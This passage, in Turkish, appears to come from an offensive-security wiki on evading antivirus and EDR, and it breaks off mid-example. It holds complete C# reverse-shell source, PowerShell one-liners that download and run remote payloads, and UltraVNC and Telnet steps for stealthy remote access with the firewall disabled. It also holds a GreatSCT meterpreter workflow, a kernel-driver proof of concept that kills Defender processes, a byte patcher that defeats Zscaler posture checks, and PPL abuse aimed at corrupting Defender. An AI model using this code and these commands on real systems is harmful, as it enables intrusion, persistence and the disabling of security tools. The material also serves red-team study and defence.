3.  Proxy-call stripping – ConfuserEx, decompilation'ı daha da bozmak için direct method call'ları lightweight wrapper'larla (diğer adıyla *proxy call'lar*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra opaque wrapper function'lar (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini gözlemlemelisiniz.

4.  Manual clean-up – Ortaya çıkan binary'yi dnSpy altında çalıştırın; *real* payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğunlukla bunu `<Module>.byte_0` içinde initialize edilen TLV-encoded bir byte array olarak saklar.

Yukarıdaki chain, malicious sample'ı çalıştırmaya **gerek kalmadan** execution flow'u geri yükler – offline bir workstation üzerinde çalışırken kullanışlıdır.

> 🛈  ConfuserEx, sample'ları otomatik olarak triage etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve tamper-proofing yoluyla artırılmış yazılım güvenliği sağlayabilen, [LLVM](http://www.llvm.org/) compilation suite'in open-source bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir external tool kullanmadan ve compiler'ı değiştirmeden, compile time'da obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework tarafından üretilen ve uygulamayı crack etmek isteyen kişinin işini biraz daha zorlaştıracak bir obfuscated operations katmanı ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil olmak üzere çeşitli pe türlerini obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executables için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan ve LLVM-supported diller için fine-grained code obfuscation framework'üdür. ROPfuscator, regular instructions'ı ROP chains'e dönüştürerek bir programı assembly code level'da obfuscate eder ve normal control flow anlayışımızı engeller.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürebilir ve ardından bunları load edebilir.

## SmartScreen & MoTW

İnternetten bazı executable'ları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaya karşı korumak üzere tasarlanmış bir security mechanism'dir.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen temel olarak reputation-based bir yaklaşımla çalışır; bu, yaygın olarak indirilmemiş uygulamaların SmartScreen'i tetikleyerek son kullanıcıyı uyaracağı ve dosyayı çalıştırmasını engelleyeceği anlamına gelir (dosya yine de More Info -> Run anyway seçeneğine tıklanarak çalıştırılabilir).

**MoTW** (Mark of The Web), internetten indirilen dosyalar indirilirken otomatik olarak oluşturulan ve dosyanın indirildiği URL ile birlikte Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sinin kontrol edilmesi.</p></figcaption></figure>

> [!TIP]
> **trusted** bir signing certificate ile imzalanmış executable'ların **SmartScreen'i tetiklemeyeceğini** unutmamak önemlidir.

Payload'larınızın Mark of The Web almasını engellemenin oldukça etkili bir yolu, onları ISO gibi bir tür container'ın içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **non NTFS** volume'lara uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak amacıyla payload'ları output container'ları içine paketleyen bir tool'dur.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarının içine paketleyip SmartScreen bypass etme demosu.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları loglamasına** olanak tanıyan güçlü bir logging mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, user space process'in **`EtwEventWrite`** fonksiyonunun herhangi bir olay loglamadan hemen dönmesini sağlamak da mümkündür. Bu işlem, fonksiyonun bellekte patch'lenerek hemen dönmesinin sağlanmasıyla gerçekleştirilir ve böylece ilgili process için ETW logging devre dışı bırakılır.

Daha fazla bilgiyi **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinde bulabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini belleğe yüklemek uzun zamandır bilinen bir yöntemdir ve AV tarafından yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ oldukça iyi bir yöntemdir.

Payload doğrudan belleğe yükleneceği ve diske dokunmayacağı için yalnızca tüm process için AMSI'yi patch'lememiz gerekir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma yeteneğini zaten sunar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir sacrificial process başlatmayı**, post-exploitation kötü amaçlı kodunuzu bu yeni process'e inject etmeyi, kötü amaçlı kodunuzu çalıştırmayı ve işlem tamamlandığında yeni process'i sonlandırmayı içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, çalıştırmanın Beacon implant process'imizin **dışında** gerçekleşmesidir. Bu, post-exploitation işlemlerimizden birinde bir şeyler ters giderse veya bu işlem yakalanırsa **implant'imizin hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma olasılığınızın daha yüksek olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation kötü amaçlı kodunun **kendi process'ine** inject edilmesini içerir. Böylece yeni bir process oluşturmak ve bu process'in AV tarafından taranmasını sağlamak zorunda kalmazsınız; ancak dezavantajı, payload'unuzun çalıştırılması sırasında bir şeyler ters giderse çökebileceği için **beacon'ınızı kaybetme** olasılığınızın **çok daha yüksek** olmasıdır.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading hakkında daha fazla bilgi edinmek istiyorsanız [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) adresindeki makaleye ve InlineExecute-Assembly BOF'larına ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assembly'lerini **PowerShell üzerinden** de yükleyebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) içeriklerine göz atın.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içerisinde önerildiği üzere, ele geçirilmiş makineye **Attacker Controlled SMB share üzerinde kurulu interpreter environment'a** erişim vererek diğer dilleri kullanarak kötü amaçlı kod çalıştırmak mümkündür.

Interpreter Binary'lerine ve SMB share üzerindeki environment'a erişim sağlayarak bu dillerdeki **arbitrary code'u ele geçirilmiş makinenin belleği içinde çalıştırabilirsiniz**.

Repo, Defender'ın script'leri hâlâ taradığını; ancak Go, Java, PHP vb. kullanarak **static signature'ları bypass etmek için daha fazla esnekliğe** sahip olduğumuzu belirtiyor. Bu dillerde rastgele, obfuscate edilmemiş reverse shell script'leriyle yapılan testler başarılı olmuştur.

## TokenStomping

Token stomping, bir saldırganın **access token'ı veya EDR ya da AV gibi bir security product'ı manipüle etmesine** olanak tanıyan ve böylece ayrıcalıklarını azaltarak process'in sonlandırılmamasını, ancak kötü amaçlı etkinlikleri kontrol etmek için gerekli izinlere sahip olmamasını sağlayan bir tekniktir.

Bunu önlemek için Windows, **external process'lerin** security process'lerinin token'ları üzerinde handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) içerisinde açıklandığı üzere, Chrome Remote Desktop'ı kurbanın bilgisayarına deploy etmek ve ardından bilgisayarı ele geçirip persistence sağlamak için kullanmak kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine, ardından Windows için MSI dosyasına tıklayarak MSI dosyasını indirin.
2. Installer'ı kurban makinede sessizce çalıştırın (admin gereklidir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönüp next'e tıklayın. Wizard sizden authorize etmenizi isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Verilen parametreyi bazı değişikliklerle çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI kullanmadan pin ayarlamayı sağlayan pin parametresine dikkat edin).


## Advanced Evasion

Evasion oldukça karmaşık bir konudur; bazen tek bir sistemdeki birçok farklı telemetry kaynağını hesaba katmanız gerekir. Bu nedenle mature environment'larda tamamen undetected kalmak neredeyse imkânsızdır.

Karşılaşacağınız her environment'ın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha Advanced Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından gerçekleştirilen bu konuşmayı izlemenizi önemle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu aynı zamanda [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında gerçekleştirilen başka bir harika konuşmadır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

**Binary'nin bölümlerini**, Defender'ın hangi bölümün kötü amaçlı olduğunu **bulana kadar kaldıran** ve ardından bunu size ayırarak gösteren [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz.\
Aynı işi yapan başka bir araç da, hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık web üzerinden sunan [**avred**](https://github.com/dobin/avred) aracıdır.

### **Telnet Server**

Windows10'a kadar tüm Windows sürümleri, şu komut çalıştırılarak (administrator olarak) kurulabilen bir **Telnet server** ile birlikte geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlasın** ve şimdi **çalıştırın**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet portunu değiştir** (stealth) **ve firewall'ı devre dışı bırak**:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Şuradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup dosyasını değil, bin indirmelerini kullanın)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Ardından _**winvnc.exe**_ binary'sini ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker**, reverse **VNC connection** almaya **hazır** olması için kendi **host**'u içinde `vncviewer.exe -listen 5900` binary'sini **çalıştırmalıdır**. Ardından, **victim** içinde: winvnc daemon'unu `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Stealth'i korumak için birkaç şey yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın; aksi hâlde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın; aksi hâlde [config window](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın; aksi hâlde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Şuradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT içinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi `msfconsole -r file.rc` ile **lister'ı başlatın** ve **xml payload'ı** şu komutla **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compiler kullanarak
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanımı örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Kendi Güvenlik Açığı Bulunan Driver'ınızı Getirin (BYOVD) – AV/EDR'yi Kernel Space'ten Sonlandırma

Storm-2603, ransomware bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir console utility kullandı. Araç, **kendi savunmasız ancak *signed* driver'ını** getirir ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemleri gerçekleştirmek için bu driver'ı kötüye kullanır.<sup>[[12]](#references)</sup>

Önemli çıkarımlar
1. **Signed driver**: Diske bırakılan dosya `ServiceMouse.sys` olsa da binary, Antiy Labs’ın “System In-Depth Analysis Toolkit” ürünündeki meşru olarak signed driver olan `AToolsKrnl64.sys` dosyasıdır. Driver geçerli bir Microsoft signature taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır driver'ı bir **kernel service** olarak kaydeder, ikinci satır ise `\\.\ServiceMouse`'un user land'den erişilebilir olması için driver'ı başlatır.
3. **Driver tarafından sunulan IOCTL'ler**
| IOCTL code | Yetenek                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir process'i sonlandırma (Defender/EDR servislerini öldürmek için kullanılır) |
| `0x990000D0` | Diskteki rastgele bir dosyayı silme |
| `0x990001D0` | Driver'ı unload etme ve service'i kaldırma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden çalışır**:  BYOVD user-mode korumalarını tamamen atlar; kernel'de çalışan code, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *protected* process'leri açabilir, sonlandırabilir veya kernel object'leri değiştirebilir.

Detection / Mitigation
•  Windows'ın `AToolsKrnl64.sys` dosyasını yüklemeyi reddetmesi için Microsoft’un vulnerable-driver block list'ini (`HVCI`, `Smart App Control`) etkinleştirin.
•  Yeni *kernel* service oluşturulmalarını izleyin ve bir driver world-writable bir directory'den yüklendiğinde veya allow-list'te bulunmadığında alert oluşturun.
•  User-mode handle'larının custom device object'lerine açılmasını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Disk Üzerindeki Binary Patching ile Zscaler Client Connector Posture Check'lerini Bypass Etme

Zscaler’ın **Client Connector** ürünü device-posture kurallarını local olarak uygular ve sonuçları diğer component'lere iletmek için Windows RPC'ye güvenir. İki zayıf design choice, tam bir bypass'ı mümkün kılar:

1. Posture evaluation **tamamen client-side** gerçekleşir (server'a bir boolean gönderilir).
2. Internal RPC endpoint'ler yalnızca bağlantı kuran executable'ın Zscaler tarafından **signed** olduğunu doğrular (`WinVerifyTrust` aracılığıyla).<sup>[[11]](#references)</sup>

**Disk üzerindeki dört signed binary'yi patch'leyerek** her iki mekanizma da etkisizleştirilebilir:

| Binary | Patch'lenen original logic | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her check'in compliant olması için her zaman `1` döndürür |
| `ZSAService.exe` | `WinVerifyTrust`'e indirect call | NOP-ed ⇒ herhangi bir (unsigned olsa bile) process RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tunnel üzerindeki integrity check'leri | Short-circuit edilir |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyaları değiştirdikten ve service stack'i yeniden başlattıktan sonra:

* **Tüm** posture check'ler **green/compliant** görünür.
* İmzasız veya değiştirilmiş binary'ler named-pipe RPC endpoint'lerini (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`) açabilir.
* Compromised host, Zscaler policy'leri tarafından tanımlanan internal network'e unrestricted access elde eder.

Bu case study, tamamen client-side trust kararlarının ve basit signature check'lerinin birkaç byte patch'i ile nasıl aşılabildiğini gösterir.

## LOLBIN'lerle Protected Process Light (PPL) Kullanarak AV/EDR'yi Değiştirme

Protected Process Light (PPL), yalnızca eşit veya daha yüksek seviyede protected process'lerin birbirlerine müdahale edebilmesini sağlayan bir signer/level hierarchy uygular. Offensive açıdan, PPL-enabled bir binary'yi legitimate şekilde başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, benign functionality'yi (ör. logging) AV/EDR tarafından kullanılan protected directory'lere karşı kısıtlı, PPL-backed bir write primitive'e dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir process'i PPL olarak çalıştıran unsurlar
- Hedef EXE (ve yüklenen tüm DLL'ler), PPL-capable bir EKU ile imzalanmış olmalıdır.
- Process, şu flag'ler kullanılarak CreateProcess ile oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary'nin signer'ı ile eşleşen compatible bir protection level istenmelidir (ör. anti-malware signer'ları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'ları için `PROTECTION_LEVEL_WINDOWS`). Yanlış level'lar creation işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS protection hakkında daha geniş bir giriş için ayrıca bkz.:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level'ı seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım pattern'i:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN ilkel öğesi: ClipUp.exe
- İmzalı sistem binary'si `C:\Windows\System32\ClipUp.exe` kendisini yeniden başlatır ve caller tarafından belirtilen bir path'e log file yazmak için bir parametre kabul eder.
- PPL process olarak başlatıldığında, file write işlemi PPL backing ile gerçekleşir.
- ClipUp, spaces içeren path'leri parse edemez; normalde korunan konumları belirtmek için 8.3 short path'leri kullanın.

8.3 short path yardımcıları
- Short name'leri listeleyin: Her parent directory'de `dir /x`.
- cmd'de short path türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN'i (ClipUp) bir launcher (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Korumalı bir AV directory'sinde (ör. Defender Platform) file creation işlemini zorlamak için ClipUp log-path argument'ini geçin. Gerekirse 8.3 short name'leri kullanın.
3) Hedef binary normalde çalışırken AV tarafından open/locked durumundaysa (ör. MsMpEng.exe), write işlemini boot sırasında, AV başlamadan önce gerçekleştirmek üzere daha erken ve güvenilir şekilde çalışan bir auto-start service kurun. Boot ordering'i Process Monitor (boot logging) ile doğrulayın.
4) Reboot sonrasında PPL-backed write, AV binary'lerini kilitlemeden önce gerçekleşir; hedef file'ı bozarak startup'ı engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
